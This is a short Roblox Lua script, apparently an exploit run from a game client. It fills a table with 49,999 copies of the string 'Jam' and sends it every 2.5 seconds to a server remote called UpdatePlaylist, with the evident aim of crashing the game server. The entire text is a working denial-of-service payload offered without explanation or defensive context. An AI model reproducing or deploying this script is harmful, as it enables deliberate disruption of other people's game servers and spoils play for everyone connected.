local crashTable = {};
local playlist = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("UpdatePlaylist");

for i = 1, 49999 do
    crashTable[i] = "Jam";
end;

while task.wait(2.5) do
    task.spawn(function()
        playlist:InvokeServer(crashTable);
    end);
end;
